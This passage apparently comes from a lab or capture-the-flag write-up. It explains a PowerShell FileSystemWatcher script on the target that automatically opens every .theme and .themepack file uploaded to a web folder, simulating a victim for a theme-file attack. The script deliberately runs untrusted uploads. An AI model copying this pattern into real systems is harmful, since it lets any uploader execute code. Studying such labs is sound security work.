The automation script responsible for running the uploaded theme files uses a neat technology, the `FileSystemWatcher` ( [docs](https://learn.microsoft.com/en-us/dotnet/api/system.io.filesystemwatcher?view=net-7.0)). It creates the object and assigns to it a `Path`, a `Filter`, and some configuration options like `IncludeSubdirectories` and `EnabledRaisingEvents`:

```
$theme_watchdog = New-Object System.IO.FileSystemWatcher
$theme_watchdog.Path = $directory
$theme_watchdog.Filter = "*.theme"
$theme_watchdog.IncludeSubdirectories = $false
$theme_watchdog.EnableRaisingEvents = $true

```

`$directory` is defined at the top of the script to be `"C:\inetpub\aero\uploads"`.

Then it registers this `FileSystemWatcher` with `Register-ObjectEvent`, passing it `$theme_watchdog` along with an action:

```
Register-ObjectEvent $theme_watchdog Created -Action $action -SourceIdentifier theme_watchdog

```

It does the same thing creating another watchdog, this time with a filter of `*.themepack`, with the same `-Action` value.

`$action` is defined above as a codeblock as follows:

```
$action = {
    $path = $Event.SourceEventArgs.FullPath
    New-FileCreated -path $path
    write-host "New theme uploaded at:  $path"
}

```

It gets the full path to the file that triggered the action, and then calls `New-FileCreated` on that path. `New-FileCreated` is defined earlier in the file:

```
function New-FileCreated {
    param($path)
    if (Get-Process -Name SystemSettings -ea SilentlyContinue){
        Stop-Process -name SystemSettings -Force
        }
    Start-Process -FilePath $path; sleep 15
    Remove-Item -Force $path
}

```

It checks if SystemSettings is running, and kills it if so. Then it starts the process of the path, effectively double clicking on the theme. After a 15 seconds sleep, it removes the theme file.

The full source for the script is here:

```
$directory = "C:\inetpub\aero\uploads"

function New-FileCreated {
    param($path)
    if (Get-Process -Name SystemSettings -ea SilentlyContinue){
        Stop-Process -name SystemSettings -Force
        }
    Start-Process -FilePath $path; sleep 15
    Remove-Item -Force $path
}

$action = {
    $path = $Event.SourceEventArgs.FullPath
    New-FileCreated -path $path
    write-host "New theme uploaded at:  $path"
}

$theme_watchdog = New-Object System.IO.FileSystemWatcher
$theme_watchdog.Path = $directory
$theme_watchdog.Filter = "*.theme"
$theme_watchdog.IncludeSubdirectories = $false
$theme_watchdog.EnableRaisingEvents = $true

Register-ObjectEvent $theme_watchdog Created -Action $action -SourceIdentifier theme_watchdog

$themepack_watchdog = New-Object System.IO.FileSystemWatcher
$themepack_watchdog.Path = $directory
$themepack_watchdog.Filter = "*.themepack"
$themepack_watchdog.IncludeSubdirectories = $false
$themepack_watchdog.EnableRaisingEvents = $true

Register-ObjectEvent $themepack_watchdog Created -Action $action -SourceIdentifier themepack_watchdog

```





